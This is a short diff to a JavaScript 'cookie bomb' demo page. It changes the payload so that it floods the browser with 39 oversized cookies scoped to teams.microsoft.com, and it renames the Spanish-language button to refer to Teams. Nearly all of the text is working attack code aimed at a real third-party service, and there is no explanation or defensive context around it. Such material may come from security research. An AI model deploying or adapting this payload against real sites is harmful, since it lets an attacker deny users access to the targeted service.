@@ -7,7 +7,7 @@ function CookieBomb() {
     var pollution = Array(4000).join('a');
     if(confirm('Should I Cookie Bomb '+base_domain+'?')){
     for(var i=1;i<40;i++){
-        document.cookie='bomb'+i+'='+pollution+';Path=/;SameSite=None;Secure';
+        document.cookie='bomb'+i+'='+pollution+';Domain=teams.microsoft.com;Path=/;SameSite=None;Secure';
     }
 }
 }
@@ -17,4 +17,4 @@ function CookieBomb() {
 
 <h2>Demo Cookie Bomb GitHub.io</h2>
 
-<button type="button" onclick="CookieBomb()">Bombardear me pepita</button>
+<button type="button" onclick="CookieBomb()">Bombardear me teams</button>
